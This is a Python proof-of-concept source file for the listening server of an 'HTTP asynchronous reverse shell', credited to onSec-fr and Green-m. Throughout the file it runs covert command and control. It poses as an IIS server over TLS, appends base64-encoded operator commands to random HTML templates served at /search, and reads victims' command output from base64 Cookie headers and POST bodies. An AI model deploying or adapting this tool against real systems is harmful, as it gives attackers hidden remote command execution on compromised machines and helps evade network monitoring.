#!/usr/bin/python
# -*- coding: utf-8 -*-

# HTTP ASYNCHRONE REVERSE SHELL
# Version : 0.1 POC
# Git : https://github.com/onSec-fr
#
# Update by Green-m, support for py3 and py2.
#
import ssl
import os
import base64
import threading
import sys
import random
import time
import traceback
import logging

# Config
PORT = 44443
CERT_FILE = '../server.pem'

PY3 = sys.version_info[0] >= 3

if PY3:
    import http.server as baseserver
    import http.server as httpserver

else:
    import BaseHTTPServer as baseserver
    import SimpleHTTPServer as httpserver

def debase64ify(bytes_or_str):
    if PY3 and isinstance(bytes_or_str, str):
        input_bytes = bytes_or_str.encode('utf8')
    else:
        input_bytes = bytes_or_str

    output_bytes = base64.urlsafe_b64decode(input_bytes)
    if PY3:
        return output_bytes.decode('ascii')
    else:
        return output_bytes


def base64ify(bytes_or_str):
    if PY3 and isinstance(bytes_or_str, str):
        input_bytes = bytes_or_str.encode('utf8')
    else:
        input_bytes = bytes_or_str

    output_bytes = base64.urlsafe_b64encode(input_bytes)
    if PY3:
        return output_bytes.decode('ascii')
    else:
        return output_bytes



class MyHandler(baseserver.BaseHTTPRequestHandler):
	
    # Custom headers
    def _set_headers(self):
        self.send_header("Cache-Control", "private, max-age=0")
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Vary", "Accept-Encoding")
        self.send_header("Connection", "close")
        self.end_headers()
        
    # GET events
    def do_GET(self):      
        if self.path.startswith("/search"):
            if initConn == False:
                # If client say hello, then reply hello (first connection)
                #if base64.b64decode(self.headers['Cookie']).decode('utf-8') == "HELLO":
                if debase64ify(self.headers['Cookie']) == "HELLO":
                    print((Colors.GREEN + '[!] Connection established with ' + self.client_address[0] + "\n" + Colors.END))
                    InitConn()          
                    self.send_response(200)
                    self._set_headers()
                    cmd = 'HELLO'
                    #encodedCmd = str(base64.b64encode(cmd.encode("utf-8")))
                    encodedCmd = base64ify(cmd)
                    rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
                    with open("../templates/" + rndtemplate, 'r') as file:
                        outfile = file.read() + encodedCmd
                    if PY3:
                        outfile = outfile.encode()
                    self.wfile.write(outfile)
                else:  
                    self.send_response(404)
                    self._set_headers()
                    
                    if PY3:
                        notfound = "Not found".encode()
                    else:
                        notfound = "Not found"

                    self.wfile.write(notfound)
            # Client ask for instructions
            elif debase64ify(self.headers['Cookie']) == "ASK":
                with open('search', 'r') as file:
                    outfile = file.read()
                self.send_response(200)
                self._set_headers()
                if PY3:
                    outfile = outfile.encode()
                self.wfile.write(outfile)
                if (wait == False):
                    InitFile()
            # Client reply with output
            else:
                resp = debase64ify(self.headers['Cookie'])
                if resp == "EXIT OK":
                    stop_server()
                else:
                    print((Colors.LIGHT_WHITE + "\n" + resp + Colors.END))
                    InitFile()
                    self.send_response(200)
                    self._set_headers() 

                    with open('search', 'r') as file:
                        outfile = file.read()

                    if PY3:
                        outfile = outfile.encode()
                    self.wfile.write(outfile)

                    CancelWait()
        else:
            self.send_response(404)
            self._set_headers()
            if PY3:
                notfound = "Not found".encode()
            else:
                notfound = "Not found"

            self.wfile.write(notfound)
    # 
    # Serve post, only for too long request, in the body.
    #
    def do_POST(self): 
        if self.path.startswith("/search"):
            if initConn != False:
                if debase64ify(self.headers['Cookie']) == "T0L0NG":
                    if not PY3:
                        content_length = int(self.headers.getheader('content-length', 0))
                    else:
                        content_length = int(self.headers.get('Content-Length'))
                    resp = self.rfile.read(content_length)[6:]
                    resp = debase64ify(resp)
                    print((Colors.LIGHT_WHITE + "\n" + resp + Colors.END))
                    InitFile()
                    self.send_response(200)
                    self._set_headers() 

                    with open('search', 'r') as file:
                        outfile = file.read()
                    if PY3:
                        outfile = outfile.encode()
                    self.wfile.write(outfile)

                    CancelWait()

            else:  
                #print(base64.b64decode(self.headers['Cookie']))
                self.send_response(404)
                self._set_headers()
                if PY3:
                    notfound = "Not found".encode()
                else:
                    notfound = "Not found"
                self.wfile.write(notfound)
        else:
            self.send_response(404)
            self._set_headers()
            if PY3:
                notfound = "Not found".encode()
            else:
                notfound = "Not found"
            self.wfile.write(notfound)

    # Save logs
    log_file = open('../logs/logs.txt', 'w')
    def log_message(self, format, *args):
        self.log_file.write("%s - - [%s] %s\n" %(self.client_address[0],self.log_date_time_string(),format%args))
        
def InitConn():
    global initConn
    initConn = True
    
def CancelWait():
    global wait
    wait = False

# Choose random template file    
def InitFile():
    rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
    with open("../templates/" + rndtemplate, 'r') as file:
        template = file.read()
    outfile = open("search", "w")
    outfile.write(template)
    outfile.close()

class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

# Start http server            
def start_server():
    global httpd
    print((Colors.BLUE + '[!] Server listening on port ' + str(PORT) + ', waiting connection from client...' + Colors.END))
    server_class = baseserver.HTTPServer
    MyHandler.server_version = "Microsoft-IIS/8.5"
    MyHandler.sys_version = ""
    httpd = server_class(('0.0.0.0', PORT), MyHandler)
    httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERT_FILE, server_side=True)
    httpd.serve_forever()
 
# Exit
def stop_server():
    print((Colors.YELLOW + '[!] Exit' + Colors.END))
    os.remove("search")
    os._exit(1)
    
if __name__ == '__main__':
    # Init
    initConn = False
    wait = True
    InitFile()
    try:
        # Start http server in separate thread
        daemon = threading.Thread(target=start_server)
        daemon.daemon = True
        daemon.start()
        # Wait for first connection from client
        while (initConn == False):
            pass
        while True:
            if PY3:
                cmd = input("Command> ")
            else:
                cmd = raw_input("Command> ")

            wait = True
            print((Colors.BLUE + 'Awaiting response ...' + Colors.END)) 
            encodedCmd = base64ify(cmd)
            rndtemplate = random.choice([x for x in os.listdir("../templates") if os.path.isfile(os.path.join("../templates", x))])
            with open("../templates/" + rndtemplate, 'r') as file:
                    template = file.read() + encodedCmd
            outfile = open("search", "w")
            outfile.write(template)
            outfile.close()
            # Wait for client's reply
            while (wait == True):
                time.sleep(0.5)
                pass
    except KeyboardInterrupt: 
        stop_server()
